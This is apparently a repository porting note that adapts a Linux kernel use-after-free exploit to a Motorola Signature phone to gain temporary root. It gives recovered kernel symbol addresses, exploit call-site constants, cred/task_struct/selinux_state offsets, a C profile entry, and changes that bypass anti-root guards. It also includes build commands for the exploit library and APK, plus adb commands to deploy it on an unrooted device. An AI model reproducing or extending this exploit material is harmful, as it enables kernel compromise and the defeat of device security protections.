# Motorola Signature (`kernel-msm` `android-17-release-a171wvh.21-16-16`) `6.12.58` Port

No pre-existing root is required on the target device: it runs Google's certified GKI image `6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k` (AOSP GKI tag `android16-6.12-2025-12_r26` / build `14987696`), so kernel symbols and BTF constants can be recovered directly from the official GKI distribution image.

## Target & Image Provenance

- Vendor kernel tree: `MotorolaMobilityLLC/kernel-msm` branch `android-17-release-a171wvh.21-16-16` (Snapdragon `canoe` / SM8850 platform)
- Device `uname -r`: `6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k`
- KMI: `android16-6.12`
- Official GKI image: `https://dl.google.com/android/gki/gki-certified-boot-android16-6.12-2025-12_r26.zip`
  - `boot-6.12.img`: `67,108,864` bytes, SHA-256 `eedf76b48dbe0e4225cadefac1837f03c38445af304916af964a9e446b23e8d7`
  - Unpacked `kernel` (boot header v4, uncompressed arm64 Image): `41,232,896` bytes, SHA-256 `33c44639ade31412c6af32df40b8cab4fe4cfd21d3f80e4ef6a06cfde9ee21b2`
  - Kernel banner: `Linux version 6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k (kleaf@build-host) ... #1 SMP PREEMPT Fri Mar  6 03:47:51 UTC 2026`

## `kallsyms` & BTF Extraction Results

Recovered from `kernel` using `ports/coloros-61269/recover.py` and `ports/v2505a/tools/btf_inspect.py`:

- `kallsyms`: `n=128244`, `names=0x14e28f8..0x16d71c4`, `offsets=0x16d7f30`, `base=0xffffffc080000000`, `monotonic=OK`, `shift=+0`
- `do_timer_create` (`0xffffffc080517ff8`):
  - `0xffffffc080518090` is `NOP` (`# CONFIG_MEM_ALLOC_PROFILING_ENABLED_BY_DEFAULT is not set`)
  - `0xffffffc08051809c` loads `posix_timers_cache` (`0xffffffc08278b1b0`), `+0xa0` `bl kmem_cache_alloc_noprof` -> return site `0xffffffc0805180a4` (`low21=0x1180a4`)
- `copy_process` (`0xffffffc080156b14`):
  - `0xffffffc080156c58` is `NOP`, `0xffffffc080156c68` loads `task_struct_cachep` (`0xffffffc082762498`), `+0x158` `bl kmem_cache_alloc_node_noprof` -> return site `0xffffffc080156c70` (`low21=0x156c70`)

```c
/* Added profile entry in exploit/src/K61258_plant.c */
{
    "6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k",
    0xffffffc0805180a4ULL, 0x1180a4ULL, 0x156c70ULL,
    0xffffffc0827b4648ULL, 0xffffffc08251afe0ULL, 0ULL,
    0xffffffc082542360ULL, 0xffffffc0825420e8ULL,
    0xffffffc082543cf8ULL, 0xffffffc082543828ULL, 0xffffULL, 0,
},
```

BTF & `IKCFG` checks:

- `k_itimer`: `size=0x100`, `it=0x78`
- `cred`: `size=0xb8`, `uid=0x8`
- `task_struct`: `size=0x1440`, `cred=0x900`
- `selinux_state`: `size=0x80`, `enforcing=0x0`
- `task_security_struct`: `size=0x18`, `exec_sid=0x8`, `create_sid=0xc`
- `tracepoint`: `size=0x50`, `funcs=0x48`
- Static data sanity: `root_user` (`usage=1, uid=0`), `panic_on_warn=0`
- `IKCFG`: `CONFIG_LTO_NONE=y`, `CONFIG_CFI_CLANG=y`, `CONFIG_CFI_ICALL_NORMALIZE_INTEGERS=y`, `# CONFIG_MODULE_SIG_FORCE is not set`, `CONFIG_FTRACE=y`

## Code Changes

1. `exploit/src/K61258_plant.c`:
   - Added the `6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k` profile (`vr = 0`, `sys_exit = 0ULL`).
   - Added per-profile `site_mask` to `struct k61258_profile`: existing targets keep `0x1fffffULL`, while Motorola `ab14987696` uses `0xffffULL` (live hardware KASLR slide was observed as `0x21c5700000`, 20-bit aligned rather than 21-bit aligned; both `0x80a4` and `0x6c70` are unique call sites across the entire 41 MB kernel image).
2. `exploit/src/plant_core.inc`:
   - Added configurable `SITE_MASK` macro (defaults to `0x1fffffULL` so other chains are unaffected).
   - Added `ensure_trace_buffer_size()`: Motorola defaults `/sys/kernel/tracing/buffer_size_kb` to `7` KB (2 pages), causing ring-buffer wrap during `discover_page_types` and `2048`-timer traces; expands values `< 2048` KB to `4096` KB before enabling trace events.
3. `exploit/rust-kplant/src/main.rs`: Added `is_motorola_device()` (via `ro.product.manufacturer`) to skip OPPO/ColorOS-only `rmmod oplus_secure_guard_new`, `stop riskdetect`, and `com.oplus.*` steps in `finish_manager`.
4. `app/app/src/main/java/com/shark/kty/MainActivity.kt`:
   - Registered `"6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k" to ExploitKind.CVE61258` in `PROFILE_BY_RELEASE`.
   - Added `isMotorolaDevice()` to hide inapplicable ColorOS popup/guard switches in `ExtrasScreen` and force `PYB110_UNLOAD_GUARD=0` / `PYB110_DISABLE_ANTIROOT=0`.

## Building & Read-Only Device Probe

1. Rebuild `libk61258.so` (requires Android NDK + Rust `aarch64-linux-android` target):

```bash
export ANDROID_NDK_HOME=/path/to/ndk
cd exploit/rust-kplant
CARGO_TARGET_DIR=target/k61258 cargo build --release --target aarch64-linux-android \
    --no-default-features --features k61258
cp target/k61258/aarch64-linux-android/release/kplant \
    ../../app/app/src/main/jniLibs/arm64-v8a/libk61258.so
chmod 755 ../../app/app/src/main/jniLibs/arm64-v8a/libk61258.so
```

2. Run the read-only `probe` over ADB on an unrooted device (does not trigger UAF or write kernel memory):

```bash
adb push app/app/src/main/jniLibs/arm64-v8a/libk61258.so /data/local/tmp/k61258_test
adb shell chmod 755 /data/local/tmp/k61258_test
adb shell /data/local/tmp/k61258_test probe
```

Verify output contains `PROFILE_61258=6.12.58-android16-6-gb0a9599c6c01-ab14987696-4k`, `PROBE_SLIDE=... aligned=1`, `PROBE_TASK=...`, and `PROBE_OK`.

3. Build the APK (`assembleRelease` requires `app/keystore.properties`; use `:app:assembleDebug` for testing):

```bash
cd app
./gradlew :app:assembleDebug
```

## Status

- [x] GKI image extraction, `kallsyms`/BTF/`IKCFG` constant recovery, and disassembly verification (`2026-11-12`)
- [x] Rebuilt `app/app/src/main/jniLibs/arm64-v8a/libk61258.so` with Android NDK r28c + Rust
- [x] Live read-only `probe` passed on unrooted device (`PROBE_OK`, KASLR `aligned=1`)
- [x] Built debug APK (`app/app/build/outputs/apk/debug/app-debug.apk`)
- [ ] Full in-app temporary-root end-to-end verification on device
